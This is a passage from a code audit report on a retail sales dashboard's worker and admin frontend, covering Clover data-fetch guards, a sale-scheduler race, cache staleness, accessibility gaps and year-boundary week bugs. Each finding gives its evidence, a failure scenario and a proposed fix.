**Evidence.** The Template select is `<select onchange="stPick(this.value)">` (25412). stPick (25627-25649) POSTs `{ op: 'activate', id }` to sticker-template-set just to obtain the template's fields, because GET sticker-template returns only names (worker.js:23394). The bar still offers a separate 'Use this one' button (index.html:25420), which implies that choosing and activating are different acts. stPick also replaces stTpl without checking for unsaved edits. The worker comment calls editing 'a different act from putting one on a shelf' (worker.js:23405-23407).

**Failure scenario.** A superuser opens the dropdown to look at an old 'Big price' template. With no prompt, every store's next shelf label uses it, and unsaved changes to the template they were editing are discarded. 'Now using Big price.' appears only afterwards.

**Plan.** FUTURE PLAN. 1) Worker (additive): include `items: coll.items` (id, name, fields) in the GET sticker-template response. 2) Frontend: stPick reads the fields from GET and never POSTs; activation happens only through 'Use this one' (stActivate); uiConfirm when stTpl has unsaved edits. DEPLOY: worker first, because the new frontend reads `items` from GET. Until then, stPick should fall back to `uiConfirm('Switching makes "X" the label every store prints...', { danger: true })` before activating. INTERIM, frontend-only: add exactly that confirmation now. VERIFY with a playwright run and stubbed fetch that changing the select issues no POST.

<a id="admin-settings-21"></a>
#### admin-settings-21 — Form controls are unlabeled and long-running status is never announced

*low · minor · accessibility · confidence high · `index.html:6507` · unverified*

**Evidence.** The health check's store select and both date inputs have no label, aria-label or placeholder (6507-6517); only their order tells start from end. `labels.length === 0` was measured for rh-start, rh-end, rh-store, ann-title and mso-total. Existing labels have no `for` (6481, 6486, 6617-6633). The manual-override grid uses placeholders as labels (6697-6700). The status boxes (rh-status, resnapshot-status, backfill-sales-status, mso-status, srr-status and others) have no role=status or aria-live, although runs take minutes. Both 'Upload CSV file' controls are a `<label>` wrapping a `class="hidden"` file input (6774-6777, 6802-6805), so the keyboard can't reach them.

**Failure scenario.** A screen-reader user hears 'date, edit' twice with no way to tell start from end, never hears the 13-week backfill finish or fail, and can't open the CSV upload from the keyboard.

**Proposed fix.** Frontend-only. Add aria-labels ('Health check store', 'Start date', 'End date') or visible labels with `for`; add for/id pairs to the existing labels and aria-labels to the mso/mlh inputs; add `role="status" aria-live="polite"` to each *-status div; change `class="hidden"` on the file inputs to `class="sr-only"` and add a `focus-within:ring` to their labels.

<a id="admin-settings-23"></a>
#### admin-settings-23 — Every visit to Admin Settings re-reads and parses 42 full item snapshots

*low · minor · performance · confidence medium · `index.html:22914` · unverified*

**Evidence.** The navigateToPage wrapper calls `loadCategoryCosts(); stLoad(); ... loadRepairBackups()` on every entry to 'admin-settings' (22914-22927). It does so even when the router refused the page, because it runs after `orig(page)` without checking. The category-costs GET reads `items:<store>:<date>` for 7 days x 6 stores and JSON-parses all 42 whole snapshots just to tag which L3s sold (worker.js:19813-19842). repair-backups lists every backup and fetches its meta (27112-27114). loadCategoryCosts also replaces ccCosts on each entry, discarding unsaved edits.

**Failure scenario.** A superuser who moves between Admin Settings and another page triggers about 45 KV reads plus a parse of 42 snapshots on every return, and loses any category costs typed but not yet saved.

**Proposed fix.** Frontend-only. Load the cost panel lazily: use an IntersectionObserver on #cc-list, or load on the first focus of #cc-search or Save. Keep the ccLoaded guard, and skip the reload while unsaved edits exist. In the wrapper, check `currentPage === 'admin-settings'` after `orig(page)` so a refused navigation fires nothing.

<a id="admin-settings-24"></a>
#### admin-settings-24 — noncategorized-items reads KV one key at a time and has no range cap

*low · minor · performance · confidence high · `worker.js:19433` · unverified*

**Evidence.** `while (current <= endDate) { ... for (const st of scanStores) { const snap = await env.SALES_SNAPSHOTS.get(`items:${st.toLowerCase()}:${dateStr}`, "json"); ...` (worker.js:19429-19436) awaits each read in sequence, and start/end are neither validated nor capped. 'Load Uncategorized Items' passes whatever Start/End the user typed (index.html:16985).

**Failure scenario.** A 90-day range for one store makes 90 serial KV round-trips, several seconds of waiting. A multi-year range exceeds the per-invocation subrequest cap and fails with a worker error instead of a clear message.

**Proposed fix.** Worker-only. Validate the YYYY-MM-DD format, cap the range (e.g. 120 days) with a 400 and a message, and fetch in chunks of about 40 keys with Promise.all, aggregating in date order.

<a id="admin-settings-25"></a>
#### admin-settings-25 — Admin writes leave the 5-minute API cache stale, and invalidateApiCache is never called

*low · minor · bug · confidence high · `index.html:16878` · unverified*

**Evidence.** invalidateApiCache (16878-16882) has no callers. cachedFetch keeps history_d1 (8067), channel-range (9578), weekly-summary and weekly-t13 (19857, 19875) for 5 minutes. None of the admin write functions clear `_apiCache`; only push and clear announcement do (21429, 21442).

**Failure scenario.** A superuser corrects BL2's total with Manual Sales Override, opens Weekly Retail to check, and sees the old figure for up to five minutes. They conclude the save failed and enter it again or start a re-snapshot.

**Proposed fix.** Frontend-only. Call `_apiCache.clear()` after every successful write on this page: _submitOverride, runRebuildWeekSummaries, runBackfillSales13w, runReSnapshot, runRepair, restoreRepairBackup, saveCategoryOverrides, resnapshotRecent and the SRR/ISR re-snapshots. Delete invalidateApiCache or put it to use.

<a id="admin-settings-26"></a>
#### admin-settings-26 — Destructive bulk tools look exactly like the safe read-only ones

*low · minor · ui-ux · confidence high · `index.html:6661` · unverified*

**Evidence.** 'Run health check' (read-only, 6518), 'Backfill Last 13 Weeks' (6661), 'Re-snapshot Item Sales' (6636), 'Save Bulk Entries' (6713) and the SRR 'Re-snapshot' (16180) all share the primary `bg-[#3BB54A] ... text-[#06210f]` style. The only red-outlined control is the announcement's 'Clear' (6494). The legacy Admin Tools sit right under the Repair console with nothing saying the console supersedes them. The money columns in the repair, SRR and ISR tables lack `tabular-nums` (6527, 16161, 16727), although DESIGN.md §2.2 requires it for all currency.

**Failure scenario.** The page's safest action and its most dangerous one look the same, so nothing slows a hurried superuser down before a 546-store-day overwrite.

**Proposed fix.** Frontend-only markup. Give the re-pull and overwrite buttons the existing danger outline (`border border-op-bad/30 text-opl-bad dark:text-[#f87171] hover:bg-op-bad/10`). Move Backfill 13 Weeks, Re-snapshot Item Sales and Backfill Basket Counts into a collapsed `<details>` titled 'Legacy bulk tools — re-pull without guards; prefer the Repair console'. Add `tabular-nums` to the three tables.

<a id="admin-settings-27"></a>
#### admin-settings-27 — Announcement preview shows items the server drops, and the form can re-push a cleared announcement

*low · minor · ui-ux · confidence high · `index.html:21403` · unverified*

**Evidence.** announcement-set keeps only the first 12 items (`.slice(0, 12)`) and truncates titles to 120 and details to 240 characters (worker.js:26592-26595). previewAnnouncement renders every parsed line untruncated (index.html:21403-21411), and _parseAnnItems has no limit. loadAnnouncementForm reads through the 5-minute cachedFetch (21392) and doesn't clear the fields when there is no current announcement.

**Failure scenario.** A 15-line announcement previews fine, but users silently receive only the first 12. If another superuser has cleared it, this form shows the old text for up to 5 minutes, and 'Push to all users' re-broadcasts it.

**Proposed fix.** Frontend-only. Apply the server's limits in _parseAnnItems (12 items; t sliced to 120 and d to 240 characters) and warn 'Only the first 12 items are sent' when exceeded. Load the form with a plain fetch and clear the fields when `announcement` is null.

<a id="admin-settings-28"></a>
#### admin-settings-28 — ISR re-snapshot: the final refresh has no error handling and caches are not invalidated

*low · minor · bug · confidence high · `index.html:16812` · unverified*

**Evidence.** After its loop, runIsrResnapshotRange runs `const resp = await fetch(...item-l2-totals...); const data = await resp.json(); if (data.categories) {...}` (16812-16822) with no try/catch and no resp.ok check. The per-date fetches use `.then(r => r.json())` without checking r.ok (16802-16805). Unlike runReSnapshot (15256), it never deletes `itemSalesCache[`${store}:${date}`]`.

**Failure scenario.** A network blip on the final refresh leaves the status stuck at 'Re-snapshotting item sales for BL1 (60/60)…' with an unhandled rejection. Store Detail keeps showing the pre-re-snapshot item sales until a reload.

**Proposed fix.** Frontend-only. Wrap the refresh in try/catch with `if (!resp.ok) throw ...` and set an error status. Delete `itemSalesCache[`${store}:${date}`]` for each fulfilled date, as runReSnapshot does.

<a id="admin-settings-29"></a>
#### admin-settings-29 — A per-day Sales Report spanning two months is labelled and compared as one month

*low · minor · bug · confidence medium · `index.html:15968` · unverified*

**Evidence.** parseCloverSalesReport takes the daily report's month from the first column only: `const ym = dayCols[0].date.slice(0, 7);` (15968). _renderSrrDailyImport labels the import with that month (16059, 16072). After the import, runSrrImportDaily compares `monthly = [{ yearMonth, cloverNet: daily.reduce(...) }]`, the total of every day, against our figure for just that one month (16126-16129).

**Failure scenario.** Importing a Jan 15 – Feb 14 daily report shows 'January 2026' in the prompt and writes days from both months. January then appears off by about two weeks of sales, with a 'Re-snapshot' button that invites a destructive re-pull on a false delta.

**Proposed fix.** Frontend-only. Derive the months from all the day columns. If there is more than one, group `daily` by `date.slice(0,7)`, label the prompt with the actual range, and pass one `{ yearMonth, cloverNet }` per month to _srrFetchOurMonths.

</details>

<a id="worker-core"></a>
### Worker core (Clover fetching, snapshots, rollups)

The worker core is carefully written and heavily annotated. It already carries real guards: the zero-order, negative and manual-override guards in fetchAggregateAndSnapshot, a magnitude guard with backup in rebuildItemSnapshot, null-on-failed-page in fetchItemOrders and fetchTransactionOrders, WOULD_LOSE_ROWS on banking, and store scoping on the fall-through route. The biggest risks are places where Clover returning less, or failing, is still written down as truth: 1) A failed /v3/refunds or /v3/credits fetch is turned into an empty list. It is then banked as a complete transaction-archive day (I reproduced this) and written into daily_sales and the KV snapshots as inflated totals. 2) The nightly clientCreatedTime sweep re-pulls two healthy prior days with no magnitude guard. A 3-of-10-order fetch rewrote D1 and KV from 990 to 290 and reported "ok". It also overwrites the item snapshot even when the zero-order guard refused the sales write, while telling the caller it was skipped. 3) The live ?store= route runs saveSnapshot with no guards. Any store manager's dashboard poll overwrote a manual-override row, and the route honours a caller-supplied `since`. 4) The every-minute sale scheduler has no claim step: overlapping runs compounded a 20% sale into "SALE SALE … $6.40", which later "reverted" to $8.00. A single transient Clover 5xx at revert time leaves an item discounted forever, and nothing is logged. 5) Retail week 1 crosses the calendar year. resolveWeekDates matches `date LIKE 'YYYY-%'` and buildStoreWeekly queries [min,max] of the result, so T13 and the WRS show a whole year of sales (365,000 vs 7,000, reproduced) for the week starting 2026-12-27. F26 week 1 already shows only 4 of its 7 days. On performance, the nightly cron re-does a lot of work: the same week is rolled up up to 4 times, refunds, credits, overrides and costs are fetched again for every sweep call, and each cross-day refund's order is looked up about 4 times with bare fetch. This is in the one invocation closest to the subrequest ceiling. Separately, every live dashboard call returns the raw Clover order array, which the client no longer reads, plus a KV put, a D1 ALTER TABLE and a D1 upsert.

| ID | Sev | Size | Category | Finding | Where | Verified |
|---|---|---|---|---|---|---|
| [worker-core-1](#worker-core-1) | high | minor | bug | Retail week 1 (crossing the calendar year) is summed as the WHOLE calendar year by buildStoreWeekly's [min,max] range query | `worker.js:3178` | unverified |
| [worker-core-3](#worker-core-3) | high | minor | security | Live ?store= route writes unguarded snapshots: overwrites manual-override rows and honours a caller-supplied `since` | `worker.js:28100` | unverified |
| [worker-core-4](#worker-core-4) | high | minor | bug | Sale scheduler: one transient Clover error at revert time leaves the item on sale permanently, and nothing is logged | `worker.js:1637` | unverified |
| [worker-core-5](#worker-core-5) | high | minor | bug | Sale scheduler has no claim step: overlapping runs compound the discount and corrupt original_price | `worker.js:1579` | unverified |
| [worker-core-6](#worker-core-6) | high | minor | bug | Transaction archive banks a day as complete=1 even when the /v3/refunds or /v3/credits fetch failed | `worker.js:2226` | unverified |
| [worker-core-8](#worker-core-8) | high | minor | bug | snapshotDayByClientTime overwrites the item snapshot after the zero-order guard refused the sales write, and reports 'skipped' | `worker.js:4839` | unverified |
| [worker-core-2](#worker-core-2) | high | major | bug | resolveWeekDates and the nightly week rollup pick the wrong dates, and the wrong KV year, for the week that crosses a year boundary | `worker.js:2991` | unverified |
| [worker-core-7](#worker-core-7) | high | major | bug | Snapshot writers treat a failed refunds or credits fetch as 'no refunds' and write inflated totals; no guard catches over-statement | `worker.js:2521` | unverified |
| [worker-core-9](#worker-core-9) | high | major | bug | Nightly clientCreatedTime sweep re-pulls two healthy prior days with no magnitude guard, so a short Clover fetch overwrites D1 and KV | `worker.js:4837` | unverified |
| [worker-core-10](#worker-core-10) | high | major | bug | Fully refunded same-day orders are dropped by the `order.total <= 0` skip and then their refund is subtracted again | `worker.js:3794` | unverified |
| [worker-core-12](#worker-core-12) | medium | minor | bug | Live route answers HTTP 200 with aggregate:null when Clover fails, so the client shows a confident $0 | `worker.js:28170` | unverified |
| [worker-core-13](#worker-core-13) | medium | minor | performance | Cross-day refund lookups use bare fetch with unbounded parallelism; dropped lookups misfile refunds and skew the bin/retail split | `worker.js:4589` | unverified |
| [worker-core-14](#worker-core-14) | medium | minor | bug | cloverFetch retries only 429: one 5xx or network error drops a whole page, and the cron never retries the unbanked day | `worker.js:1371` | unverified |
| [worker-core-15](#worker-core-15) | medium | minor | bug | fetchItemCategoryMap silently returns an empty or partial map on a Clover failure, and callers write heuristic categories as truth | `worker.js:1682` | unverified |
| [worker-core-16](#worker-core-16) | medium | minor | performance | Nightly cron repeats work in its most budget-constrained invocation (week rolled up to 4x, refunds, credits, overrides and costs fetched again per sweep call) | `worker.js:4837` | unverified |
| [worker-core-17](#worker-core-17) | medium | minor | performance | Live ?store= response ships the raw Clover order array the client no longer reads, and reads item costs it never uses | `worker.js:28186` | unverified |
| [worker-core-11](#worker-core-11) | medium | major | bug | Live route leaves out manual refunds (credits), so the live cards and intraday D1 are high by that amount and the total drops overnight | `worker.js:28157` | unverified |
| [worker-core-18](#worker-core-18) | low | minor | code-quality | saveSnapshot runs a failing ALTER TABLE on every call, then swallows D1 write failures, so callers report success | `worker.js:4640` | unverified |
| [worker-core-19](#worker-core-19) | low | minor | bug | fetchAggregateAndSnapshot fails open: if the guard SELECT throws, it writes without the manual-override and zero-order guards | `worker.js:4775` | unverified |
| [worker-core-20](#worker-core-20) | low | minor | bug | getStartOfDayET and getETToday are off by one hour on DST-change days; banking uses fixed 24 h days | `worker.js:169` | unverified |
| [worker-core-21](#worker-core-21) | low | minor | performance | CORS sends no Access-Control-Max-Age, so almost every JSON POST, PATCH or DELETE pays an extra preflight round-trip | `worker.js:4896` | unverified |
| [worker-core-22](#worker-core-22) | low | minor | security | Reporting API marks key-authenticated sales data `Cache-Control: public` and accepts the key in the query string | `worker.js:15833` | unverified |

<details><summary>Details: evidence, failure scenario, proposed fix</summary>

<a id="worker-core-1"></a>
#### worker-core-1 — Retail week 1 (crossing the calendar year) is summed as the WHOLE calendar year by buildStoreWeekly's [min,max] range query

*high · minor · bug · confidence high · `worker.js:3178` · unverified*

**Evidence.** worker.js:3173-3183 queries by range: `const lo = dates.reduce(...); const hi = dates.reduce(...); ... FROM daily_sales WHERE store = ? AND date >= ? AND date <= ? ORDER BY date` — the comment says this is 'Output-identical because ... every caller passes a contiguous (gated-contiguous) list'. That is not true for week 1: resolveWeekDates (worker.js:2991-2994) returns `SELECT DISTINCT date FROM daily_sales WHERE week = ? AND date LIKE ?` with `${year}-%`. The retail calendar (migration-016: F26 wk14 = 2026-03-29, wk52 = 2026-12-20..26) puts F26 week 1 at 2025-12-28..2026-01-03 and F27 week 1 at 2026-12-27..2027-01-02, and the sheet's `week` label 'restarts every January' (worker.js:20586). So in 2026, week='1' matches Jan 1-3 AND Dec 27-31. Reproduced with the real worker through scripts/lib/worker-harness.mjs (scratchpad worker-core/probe-week1.mjs), 1000/day seeded: `weekly-t13&end=2027-01-02&weeks=1` gives BL1 netSales [365000] (expected 7000), budget [401500], txn [18250]; `weekly-summary&week=1&year=2026` gives dates [2026-01-01..03, 2026-12-27..31] and net 365000.

**Failure scenario.** On the nights of 2026-12-27..31, rollupWeekSummariesIfReady writes `week-summary:<store>:1-2026` with a full year of daily_sales. weekly-t13 reads that key for the week starting 2026-12-27, so the T13 chart shows one week at about 50x its real sales, budget and transactions. The WRS single-week view for week 1 shows the same inflated total.

**Proposed fix.** Keep the 3-param range query for the 100-bound-param cap, but only count the rows actually asked for. In buildStoreWeekly, after `dailyRows = results || [];` add:
```js
const want = new Set(dates);
dailyRows = dailyRows.filter(r => want.has(r.date));
```
This is output-identical for every contiguous caller. For a non-contiguous list it can no longer sum the gap, which bounds the damage to the 8 listed dates until worker-core-2 fixes which dates are chosen. Add a harness test that seeds F26/F27 week 1 and asserts that weekly-t13 for end=2027-01-02 is 7 days of sales.

<a id="worker-core-3"></a>
#### worker-core-3 — Live ?store= route writes unguarded snapshots: overwrites manual-override rows and honours a caller-supplied `since`

*high · minor · security · confidence high · `worker.js:28100` · unverified*

**Evidence.** worker.js:28098-28100: `const since = url.searchParams.get("since"); const et = getETToday(); const startOfToday = since ? Number(since) : et.startOfDay;`. The result is then persisted as TODAY at worker.js:28201-28203: `ctx.waitUntil(saveSnapshot(env, targetStore, et.dateStr, aggregate));`. saveSnapshot (4642-4654) runs `ON CONFLICT(store, date) DO UPDATE SET total=excluded.total, retail=..., bin=..., order_count=...` with no is_manual_override check. Only fetchAggregateAndSnapshot checks it (4750), and this route bypasses that. Probe (scratchpad worker-core/probe-live.mjs): a manual-override row for today (total 5555, is_manual_override=1), then a BL1 manager's GET `?store=BL1&since=0` → Clover was asked `orders?filter=createdTime>=0...` → the row became `{ total: 100, retail: 100, bin: 0, is_manual_override: 1 }`. The frontend (index.html:8136) sends `since` as the BROWSER-local midnight.

**Failure scenario.** An admin enters today's real totals with ?action=manual-override during a Clover outage. The next dashboard poll by anyone with access to that store overwrites total, retail and bin with Clover's partial number. The row keeps is_manual_override=1, so the nightly and the sweep now protect the wrong value, and the manual entry is lost for good. Separately, a store manager (or a device whose timezone is not ET, between ET midnight and its own midnight) sends a `since` from an earlier day. That window's sales are written to KV and D1 as today's total, and Clover is paged back up to its retention limit.

**Proposed fix.** Two worker-only changes that only add safety.
1) worker.js:28098-28100: ignore `since` for the ET business day. Replace with:
```js
const et = getETToday();
const startOfToday = et.startOfDay; // `since` is still sent by the client; it is ignored
```
2) In saveSnapshot's upsert (4645-4654), after the SET list and before the closing backtick, add `WHERE daily_sales.is_manual_override IS NOT 1`. SQLite upsert allows a WHERE on DO UPDATE, and the unqualified column refers to the existing row. This protects every caller, not just this route.

Verify: re-run probe-live.mjs. Expect the row to stay at 5555 and the orders URL to use the ET start. Then run scripts/test-live-sales-reconcile.mjs.

<a id="worker-core-4"></a>
#### worker-core-4 — Sale scheduler: one transient Clover error at revert time leaves the item on sale permanently, and nothing is logged

*high · minor · bug · confidence high · `worker.js:1637` · unverified*

**Evidence.** worker.js:1619-1644: every revert failure, including a network error or 5xx, goes through `UPDATE sale_schedules SET status='error', error_msg=? WHERE id=?`. The revert query only picks `status='active'` (1615), so an 'error' row is never retried. cloverFetch (1371-1380) retries only 429, so a 502/503 or a thrown fetch fails straight away. The cron discards the result: worker.js:28229 `ctx.waitUntil(processSaleSchedules(env, new Date()));` has no .then/log. Probe (scratchpad worker-core/probe-sale.mjs): one 502 on GET at revert time → `{"errors":["revert BL1/i1: Clover GET item i1 502"]}`; next tick `reverted:0`; row `{ status: 'error' }`; the Clover item stays at price 800.

**Failure scenario.** A 20%-off sale is set to end Sunday 23:59. At that minute Clover returns a 503, or the fetch times out. The row goes to 'error', and every later tick skips it. The item keeps ringing at the sale price for days or weeks until someone opens the schedule list and fixes the price by hand in Clover. The same thing makes a sale silently never start after one transient error at start time.

**Proposed fix.** In processSaleSchedules, separate permanent errors from transient ones.
- Throw a tagged error for the drift guard (1624-1626) and for computed-price aborts (1590-1592): `const e = new Error(...); e.permanent = true; throw e;`.
- In both catch blocks:
```js
if (err.permanent) { /* existing status='error' update */ }
else await env.DB.prepare("UPDATE sale_schedules SET error_msg=? WHERE id=?")
  .bind(`retrying: ${String(err.message).slice(0,480)}`, row.id).run().catch(()=>{});
```
  The status stays 'active' or 'pending', so the next tick retries.
- For activation only, give up after a window: if `now - starts_at > 30 min`, set 'error'.
- At worker.js:28229, add `.then(r => { if (r?.errors?.length) console.error('sale-scheduler', JSON.stringify(r.errors)); })`.

Verify with probe-sale.mjs: one 502, then a good tick → status 'completed' and price restored.

<a id="worker-core-5"></a>
#### worker-core-5 — Sale scheduler has no claim step: overlapping runs compound the discount and corrupt original_price

*high · minor · bug · confidence medium · `worker.js:1579` · unverified*

**Evidence.** worker.js:1579-1584 selects `status='pending' AND starts_at <= ?` with no claim. The row is only flipped after two Clover calls: `UPDATE sale_schedules SET original_price=?, sale_price=?, original_name=?, status='active', activated_at=? WHERE id=?` (1595-1600, unconditional on status). A second run that selects the row before that update, and whose GET lands after the first run's POST, reads the already-discounted price and name. Probe (scratchpad worker-core/probe-sale.mjs, run B's GET delayed as it would be behind the Worker's 6-connection queue): Clover item → `{ price: 640, name: 'SALE SALE Widget (was $10.00) (was $8.00)' }`, row `original_price: 800`, and after the revert tick the item is `{ price: 800, name: 'SALE Widget (was $10.00)' }`. cancel-sale-schedule (28011-28014) has the same race: the cron's unconditional UPDATE sets a just-cancelled row back to 'active'.

**Failure scenario.** A group sale covers dozens of items at one store (up to 50 are processed in parallel). Clover throttles with 429 backoffs (1s, 2s, 4s per request), so the tick runs past 60 s and the next every-minute tick overlaps it. The same can happen when an admin calls run-sale-scheduler-now at a minute boundary. Affected items get a sale on top of the sale and, after the end time, stay permanently at the first sale price with 'SALE … (was $…)' in their POS name.

**Proposed fix.** Claim each row atomically before touching Clover, using existing columns (no migration):
```js
// activation
const c = await env.DB.prepare("UPDATE sale_schedules SET activated_at=? WHERE id=? AND status='pending' AND activated_at IS NULL").bind(nowIso, row.id).run();
if (!c.meta?.changes) return; // another run owns it
...
const u = await env.DB.prepare("UPDATE sale_schedules SET original_price=?, sale_price=?, original_name=?, status='active' WHERE id=? AND status='pending'").bind(...).run();
if (!u.meta?.changes) await setCloverItemFields(env, row.store, row.item_id, { price: currentCents, name: item.name }); // cancelled mid-flight: undo
```
Add `AND activated_at IS NULL` to the pending SELECT. Do the same for revert with `reverted_at`, and reset `reverted_at=NULL` on a transient failure so worker-core-4's retry still works. Verify with probe-sale.mjs: the price stays 800, and the revert restores 1000 and 'Widget'.

<a id="worker-core-6"></a>
#### worker-core-6 — Transaction archive banks a day as complete=1 even when the /v3/refunds or /v3/credits fetch failed

*high · minor · bug · confidence high · `worker.js:2226` · unverified*

**Evidence.** bankTransactionsDay (2226-2240) stops only on `orders === null`. Refunds and credits come from fetchRefundElements and fetchManualRefunds, which swallow every failure: worker.js:1749-1752 `catch (e) { console.warn(...); return []; }` and 1788-1791, the same. assessArchiveCompleteness then allows 5% drift (2183, 2213-2216). Probe (scratchpad worker-core/probe-bank.mjs, /refunds answering 429 five times): `"complete":1,"wrote":true,"net":200,"expectedNet":194`, `needsAttention: []`, refund rows banked `{ n: 0 }`.

**Failure scenario.** The nightly banks today−3. Clover rate-limits /v3/refunds, which runs in parallel with the orders and credits pages on the same token. That day's refunds and manual refunds are left out of payment_archive, but the day is marked complete, so no one re-banks it. About 87 days later Clover drops the day and the archive becomes the only record, missing every refund. The Transactions drawer then overstates payments net, and the 'Refunds' tab is empty for a day that had refunds.

**Proposed fix.** Add an opt-in strict mode that changes nothing for other callers:
```js
async function fetchRefundElements(store, env, since, until = null, { strict = false } = {}) { ... catch (e) { console.warn(...); return strict ? null : []; } }
```
Do the same for fetchManualRefunds. In bankTransactionsDay pass `{ strict: true }` to both and, after the Promise.all:
```js
if (orders === null || refunds === null || credits === null) {
  out.skipped = "INCOMPLETE_FETCH";
  out.note = orders === null ? "Clover did not return a complete order list" : "Clover refunds/credits fetch failed";
  return out;
}
```
Verify: probe-bank.mjs should report skipped INCOMPLETE_FETCH and write no row. Then run scripts/test-payment-archive.mjs.

<a id="worker-core-8"></a>
#### worker-core-8 — snapshotDayByClientTime overwrites the item snapshot after the zero-order guard refused the sales write, and reports 'skipped'

*high · minor · bug · confidence high · `worker.js:4839` · unverified*

**Evidence.** worker.js:4837-4843: `const data = await fetchAggregateAndSnapshot(...bucket); if (itemData && data && !data.skippedManualOverride) { try { await saveItemSalesSnapshot(env, store, dateStr, itemData, hourSlots); } ... }`. The condition does not check `data.skippedZeroOverwrite`, and with bucket=[] fetchAggregateAndSnapshot returns that flag (4760-4765) rather than null. Probe (scratchpad worker-core/probe-sweep.mjs via ?action=resnapshot-clienttime): healthy day (D1 990, KV items 990), then Clover returns an empty order list → response `status: 'skipped: zero/negative guard'`, D1 still 990, but KV `items:bl1:2026-09-20` net = -10 with categories ['Refund']. No backup was taken (rule 2).

**Failure scenario.** The nightly sweep, or an admin running resnapshot-clienttime over a range, gets a transient empty order list for a prior day. D1 is protected, but that day's Item Sales / category snapshot, its hourly bank, and the next week-summary rollup show only a negative Refund row. The admin response says 'skipped', so no one knows the KV history was replaced.

**Proposed fix.** worker.js:4839: change the condition to
```js
if (itemData && data && !data.skippedManualOverride && !data.skippedZeroOverwrite) {
```
That is one line and only adds safety. The nightly main pass at 28328 (`if (itemData)`) should get the same guard. Verify: probe-sweep.mjs step 2 should leave KV items at 990.

<a id="worker-core-2"></a>
#### worker-core-2 — resolveWeekDates and the nightly week rollup pick the wrong dates, and the wrong KV year, for the week that crosses a year boundary

*high · major · bug · confidence high · `worker.js:2991` · unverified*

**Evidence.** worker.js:2991-2993: `SELECT DISTINCT date FROM daily_sales WHERE week = ? AND date LIKE ?` bound to `${year}-%`. So week 1 is cut at 31 Dec / 1 Jan, and the label '1' collides with the other week 1 in the same calendar year. worker.js:3403 (rollupWeekSummariesIfReady): `const year = parseInt(todayStr.slice(0, 4), 10);` keys the summary by TODAY's year. weekly-t13 reads `week-summary:${s}:${wk}-${wkObj.start.slice(0,4)}` (worker.js:20685), keyed by the week's START year, and rebuild-week-summaries also uses the start year (27333). Probe result: `weekly-t13&end=2026-01-03&weeks=1` gives BL1 netSales [4000] for a 7x1000 week, because resolveWeekDates('1','2025') returns only 2025-12-28..31.

**Failure scenario.** Today, T13 or WRS for F26 week 1 (2025-12-28..2026-01-03) shows 4 of 7 days, or 3 of 7 via weekly-summary&year=2026, which reads as a sales collapse. From 2027-01-01 the nightly writes `1-2027` from the two 2027-dated days only, and T13 never reads that key. T13 keeps reading `1-2026`, the whole-year value from worker-core-1.

**Plan.** FUTURE PLAN.
1. Pick one fiscal-year rule that matches the retail calendar: the fiscal year of a Sun–Sat week is the calendar year of its Saturday (F26 wk1 ends 2026-01-03, F26 wk52 ends 2026-12-26, F27 wk1 ends 2027-01-02).
2. resolveWeekDates(env, week, fy): `SELECT DISTINCT date FROM daily_sales WHERE week = ? AND strftime('%Y', date(date,'weekday 6')) = ? ORDER BY date`. This always returns one contiguous Sun–Sat block.
3. Key `week-summary:` by that same fiscal year in every writer (rollupWeekSummariesIfReady derives it from `date(todayStr,'weekday 6')` rather than todayStr) and every reader (weekly-t13 uses `wkObj.end.slice(0,4)` instead of the start year). Only the straddling week 1 keys change; every other week's start year and end year already agree.
4. Audit callers that pass a request year (weekly-summary single-week mode, buildWeeklyByDayData uses `date.slice(0,4)`) against the new rule.

Deploy: worker-only; readers and writers ship together in one deploy, so ordering is not an issue. Afterwards run rebuild-week-summaries for the week-1 weeks and delete the orphaned `1-2025` / `1-2026` keys. This is a KV overwrite of stored history, so rule 7 requires explicit confirmation.

Risks: a caller that meant calendar year. Verify with a harness test across F26/F27 week 1 and week 52, and diff weekly-t13 output for a normal mid-year window before and after (it must be identical).

<a id="worker-core-7"></a>
#### worker-core-7 — Snapshot writers treat a failed refunds or credits fetch as 'no refunds' and write inflated totals; no guard catches over-statement

*high · major · bug · confidence high · `worker.js:2521` · unverified*

**Evidence.** fetchRefundsTotal worker.js:2521-2527: `catch (e) { // Refunds endpoint failure is non-fatal: returning 0 ... console.warn(...); return 0; }`. fetchRefundElements and fetchManualRefunds return [] on failure (1749-1752, 1788-1791). Callers pass that [] on as data: snapshotDayByClientTime 4814-4817 → aggregateItemSales → `binRetailOverride.total` → D1 daily_sales.total plus the `items:` KV. The nightly main pass and the admin snapshot pass `preRefunds=[]` to fetchRefundsTotal, where [] is truthy, so it never retries. The live route does the same (28115). Every guard checks only for LESS: zero-order, negative, and BACKFILL_MIN_D1_RATIO's `computedNet < d1Total * 0.99` (2913). The health check's 'short' status uses the same one-sided test. The comment at 1719 states the trade-off: 'better to over-report a single day'.

**Failure scenario.** During a Clover 429 storm or a 5xx on /v3/refunds at 23:55, the nightly writes that day's net without refunds. For a store doing $200 of refunds on $6,000 that is 3.3% high, in D1, the item snapshot and the next week-summary. The health check shows it as healthy because it only looks for short days. If the day's last sweep pass (D−2) also fails the refunds fetch, the overstated number stays for good and flows into the 8 AM email, WRS and T13.

**Plan.** FUTURE PLAN (spans six callers).
1. Give fetchRefundElements, fetchManualRefunds and fetchRefundsTotal a strict mode (see worker-core-6) that returns null on failure.
2. Every WRITING caller treats null exactly like orders===null: skip the write and report `skipped:"INCOMPLETE_FETCH"`. The callers are the nightly main pass (28296-28325), snapshotDayByClientTime (4814-4837), ?action=snapshot (18785-18822), rebuildItemSnapshot (2879-2883), resnapshot and backfill paths, and the live route's snapshot-on-fetch.
3. The live route still renders but returns `refundsUnavailable:true` (an additive field) and does not call saveSnapshot; the frontend can show a caveat later.

Deploy: worker-only; the API change is additive, so there is no ordering constraint.

Risk: more skipped days during Clover incidents. For D−1 and D−2 the sweep retries on the next nights; older days go to the Repair console.

Verify: harness probes with /refunds answering 429 → no D1 or KV writes; the full suite (`bash scripts/test.sh`) stays green.

<a id="worker-core-9"></a>
#### worker-core-9 — Nightly clientCreatedTime sweep re-pulls two healthy prior days with no magnitude guard, so a short Clover fetch overwrites D1 and KV

*high · major · bug · confidence high · `worker.js:4837` · unverified*

